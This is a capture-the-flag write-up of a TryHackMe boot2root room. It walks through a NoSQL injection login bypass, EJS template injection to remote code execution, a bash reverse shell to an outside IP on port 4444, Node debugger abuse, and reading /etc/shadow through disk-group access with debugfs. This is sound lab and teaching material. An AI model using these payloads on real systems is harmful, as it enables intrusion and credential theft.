---
title: "Do Not Disturb — Day #7"
category: "Boot2Root"
difficulty: "Medium"
date: "2026-08-02"
event: "TryHackMe Hacker Holidays"
tags: ["nosql-injection", "ejs", "ssti", "node-inspector", "disk-group-abuse"]
---

## Recon (Nmap)

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Node.js / Express fingerprint

- Express is a framework built on Node.js, similar in spirit to how Laravel sits on top of PHP.
- Likely stack:
  - DB — usually MongoDB or MySQL/PostgreSQL.
  - Backend framework — Express (`X-Powered-By: Express`).
  - Session management — `express-session`, usually a `connect.sid` cookie.

### Relational vs non-relational data

- **Non-relational (e.g. MongoDB):** data is stored as documents (like JSON), not always with the same columns:

  ```json
  { "_id": 1, "username": "admin", "password": "12345" }
  { "_id": 2, "username": "staff", "password": "pass99", "extra_field": "..." }
  ```

- **Relational (e.g. MySQL / PostgreSQL):** data is organized into tables with a fixed structure and relations between tables.

### SQL injection vs NoSQL injection

- **SQL injection:** the query is built by concatenating raw text into the query string without filtering:

  ```js
  query = "SELECT * FROM users WHERE username = '" + username + "'";
  ```

  A user can inject something like `username = admin' --` and break the intended query.

- **NoSQL injection:** there's no string concatenation. The server takes user input as an _object/structure_ instead of a plain string:

  ```
  password[$ne]=
  ```

  reaches the server as:

  ```js
  password: { "$ne": "" }   // an object, not a string
  ```

  which executes as:

  ```js
  db.users.findOne({
    username: "attendant",
    password: { $ne: "" },
  });
  ```

  `$ne` is a real MongoDB operator meaning "not equal" — so the query asks for the user `attendant` with a password not equal to an empty string, which returns the user since all users have passwords.

### Exploitation

Using the `password[$ne]=` payload against the login form logged in successfully and returned a valid session cookie.

## After login — Server-Side Template Injection

The page rendered after login turned out to be an **EJS template** (Embedded JavaScript), with user input rendered directly — opening the door to Server-Side Template Injection (SSTI).

- **What is EJS?** A template engine used in Node.js apps (often with Express) to generate dynamic HTML — values get filled in by the server at runtime, e.g. rendering `Dear Tarek` dynamically:

  ```js
  const ejs = require("ejs");
  let html = ejs.render(template, { guest: "Tarek" });
  ```

- **Why does SSTI matter here?** It can lead to RCE: you can override the injected parameter and run your own code on the server.

Testing confirmed the injection point was exploitable, and that the template had access to Node.js internals.

### Achieving RCE

```js
global.process.mainModule.require("child_process").execSync("id").toString();
```

- `global` — the global object.
- `process` — information about the running process.
- `mainModule` — refers to the app's main file (e.g. `app.js` / `server.js`), which has its own `require` function we need access to in order to run commands.
- `require('child_process')` — imports Node's built-in module for running shell commands.
- `execSync('id')` — runs the command synchronously.
- `.toString()` — returns the output as a readable string.

### Reverse shell via SSTI

```ejs
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.114.116.21/4444 0>&1"') %>
```

This gave a reverse shell as the `web` user.

## Privilege escalation

General methodology on Linux:

1. Check kernel vulnerabilities.
2. Check application vulnerabilities.
3. Check running processes (or use a tool like **LinPEAS**).

### What is Watchtower?

Watchtower is an open-source utility that monitors containers and restarts them if they become unhealthy. In this box, it had been repurposed: automation here went far beyond simple restarts — it had been weaponized into a persistent, self-executing process running malicious actions without human intervention.

### Understanding `/etc/systemd/system/`

`/etc/systemd/system/` is where local systemd unit files live:

- `/etc` — system-wide configuration.
- `systemd` — the service/process manager used by most modern Linux distros.
- `system` — the subdirectory for unit files specific to this machine.

A `.service` file defines how a process is started, stopped, and restarted, and which user runs it. The `cc-watchtower.service` unit found on this box was what told systemd to keep the Watchtower process running.

### The process run from an "inspect" port

Inspecting running processes revealed a Node process started with the `--inspect` flag. That flag starts a debugger server (default port **9229**), meant for developers to attach tools like Chrome DevTools or VS Code.

This is dangerous: if you can reach `127.0.0.1:9229` and connect in debugger mode, you can run JavaScript directly inside that same process, with that process's permissions — real privilege escalation.

The Node inspector opens a WebSocket connection using the Chrome DevTools Protocol, and you can run code with the permissions of whichever user the inspected process runs as (`pipelinesvc` in this case).

### Connecting to the inspector

```bash
node inspect 127.0.0.1:9229
```

This drops into interactive mode. From there, enter the JS execution mode:

```
repl
```

Then run commands directly:

```js
require("child_process").execSync("id").toString();
```

The `pipelinesvc` user turned out to be a member of the **disk** group.

### Why the `disk` group matters

- Membership in the `disk` group gives access to raw disk devices — `/dev/sda`, `/dev/sdb`, the physical disks themselves.
- Reading a raw device bypasses filesystem permissions entirely: it's byte-by-byte access to the disk.

List available disks:

```bash
lsblk
```

Read a file straight off the raw device, bypassing filesystem permissions:

```bash
debugfs -R 'cat /etc/shadow' /dev/nvme0n1p1
```
